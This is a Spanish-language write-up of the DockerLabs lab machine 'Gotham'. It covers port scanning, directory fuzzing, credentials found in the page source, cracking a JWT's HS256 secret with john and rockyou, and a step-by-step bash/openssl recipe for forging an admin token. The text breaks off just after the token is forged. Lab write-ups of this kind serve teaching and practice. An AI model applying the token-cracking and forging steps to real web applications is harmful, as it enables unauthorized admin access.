# 🧠 Informe de Pentesting – Máquina: Gotham

### 💡 Dificultad: Fácil

📦 **Plataforma:** DockerLabs

![Despliegue](Imagenes/logo.png)

---

# 🚀 Despliegue de la Máquina

Para iniciar la máquina vulnerable, primero descomprimimos el archivo proporcionado y posteriormente ejecutamos el script de despliegue:

```bash
unzip gotham.zip
sudo bash auto_deploy.sh gotham.tar
```

Una vez finalizado el proceso, el contenedor vulnerable quedará desplegado dentro de nuestro entorno de laboratorio y listo para comenzar las tareas de reconocimiento y explotación.

![Despliegue](Imagenes/despliegue.png)

---

# 📶 Comprobación de Conectividad

Después del despliegue, verificamos que la máquina objetivo se encuentre activa y responda correctamente a peticiones ICMP:

```bash
ping -c1 172.17.0.2
```

La respuesta recibida confirma que el host está encendido y accesible dentro de la red local del laboratorio.

![Despliegue](Imagenes/ping.png)

---

# 🔍 Escaneo de Puertos

## 🔎 Escaneo Completo de Puertos

El siguiente paso consiste en realizar un escaneo completo sobre todos los puertos TCP con el objetivo de identificar los servicios expuestos por la máquina víctima.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### Explicación de los parámetros utilizados

| Parámetro         | Descripción                                    |
| ----------------- | ---------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP.                 |
| `--open`          | Muestra únicamente los puertos abiertos.       |
| `-sS`             | Realiza un SYN Scan (escaneo semiabierto).     |
| `--min-rate 5000` | Envía al menos 5000 paquetes por segundo.      |
| `-vvv`            | Incrementa el nivel de verbosidad.             |
| `-n`              | Evita la resolución DNS.                       |
| `-Pn`             | Omite la fase de descubrimiento mediante ping. |

### 📌 Puertos Abiertos Detectados

Durante el análisis se identificaron los siguientes puertos abiertos:

* **22/tcp** → Servicio SSH
* **80/tcp** → Servicio HTTP

![Despliegue](Imagenes/nmapuno.png)

---

## 🧩 Enumeración de Servicios y Versiones

Una vez identificados los puertos abiertos, realizamos una enumeración más detallada para conocer versiones, configuraciones y posibles vectores de ataque.

```bash
nmap -sCV -p22,80,3306 172.17.0.2
```

### Explicación de los parámetros

| Parámetro | Descripción                                |
| --------- | ------------------------------------------ |
| `-sC`     | Ejecuta scripts NSE por defecto.           |
| `-sV`     | Detecta versiones de servicios.            |
| `-p`      | Define los puertos específicos a analizar. |

Este análisis permite recopilar información relevante sobre los servicios activos y posibles configuraciones inseguras.

![Despliegue](Imagenes/nmapdos.png)

---

Al saber que existe el servicio http entramos al navegador:

```bash
http://172.17.0.2
```

Y encontramos un formulario de incio de sesion, se probo atacar con inyecciòn sql y con credenciales por defecto sin exito:


![Despliegue](Imagenes/pagina.png)

Se realizo fuzzin de directorio para encontrar algun vector de ataque y se encotro:

/index.php
/admin.php
/config.php
/robots.txt
/dashboard.php

Pero no se encotro alguna oportunidad de ataque

![Despliegue](Imagenes/gobuster.png)

Posteriormete se analizo el codigo fuente y se encotr unas credenciales:

guest:guest

![Despliegue](Imagenes/credencialespagina.png)

Al introducirlas se logro acceder:

![Despliegue](Imagenes/dashboadradmin.png)

Al revisar se puede notar que accedimos como usuario guest, pero nuestro nivel es de user, y para poder acceder a un centro de operaciones de red tenemos que acceder como: admin

Se uso burtsuite, se salio de la sesion y entre nuevamente con las credenciales guest:guest pero untercepte las peticioenes para analizarlo, y lo mas interente fue la parte:

```bash
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDQ2N30.YGu576Av-l0sYX3IsuYOmNjl9VoMCJ9EBBaAnC2E6YQ
```
ya que estab cadena que empieza con eyJ... y esto nos indica que es un JSON Web Token (JWT).

Desglosando el Token

Un JWT se divide en tres partes separadas por puntos (.): Cabecera (Header), Carga útil (Payload) y Firma (Signature).

![Despliegue](Imagenes/burtsuitesession.png)

Asi que lo descodificamos con:

```bash
JWT='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDk1NH0._1H0RI7lON6ajlzBUHZx4SSp_9Fa9BJ7-SJKICyCa20'

echo "$JWT" | awk -F. '{print $1 "\n" $2}' | while read -r part; do
    echo "$part" | base64 --decode --ignore-garbage 2>/dev/null | jq .
done
```

![Despliegue](Imagenes/descodificargolpe.png) 

Y esta confirmado, a si que se tiene que obtener la secret_key para poder modificar user:role por el del admin.

Se guarda la peticiòn de la Cookie:

```bash
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDQ2N30.YGu576Av-l0sYX3IsuYOmNjl9VoMCJ9EBBaAnC2E6YQ" > token.txt
```

Y ejecutamos john para encontrar la key

```bash
john token_real.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
```

Y se encuetra con exito: batman

![Despliegue](Imagenes/tokenbatman.png)

Al tener la key podemos modificar el usery el role creando una nueva cookie, se puede hacer de la siguiente forma ya que se conoce la estructura:


# 1. Definir los componentes del JWT en formato JSON plano

```bash
HEADER='{"typ":"JWT","alg":"HS256"}'
PAYLOAD='{"user":"admin","role":"admin","iat":1781480954}'
```

# 2. Función para codificar en Base64URL (elimina '=', cambia '+' por '-', '/' por '_')

```bash
b64url() {
    echo -n "$1" | base64 | tr -d '=' | tr '/+' '_-'
}
```

# 3. Codificar la cabecera y la carga útil
```bash
HEADER_B64=$(b64url "$HEADER")
PAYLOAD_B64=$(b64url "$PAYLOAD")
```

# 4. Unir las dos primeras partes (esto es lo que se firma)

```bash
DATA_TO_SIGN="${HEADER_B64}.${PAYLOAD_B64}"
```

# 5. Generar la firma HMAC-SHA256 usando la clave 'batman' y pasarla a Base64URL

```bash
SIGNATURE_B64=$(echo -n "$DATA_TO_SIGN" | openssl dgst -sha256 -hmac "batman" -binary | base64 | tr -d '=' | tr '/+' '_-')
```

# 6. Construir el JWT final

```bash
FINAL_JWT="${DATA_TO_SIGN}.${SIGNATURE_B64}"
```

# 7. Mostrar el resultado

```bash
echo "$FINAL_JWT"
```

![Despliegue](Imagenes/generartokenadmin.png)

Al tener el token priemro confirmo con burtsuite:


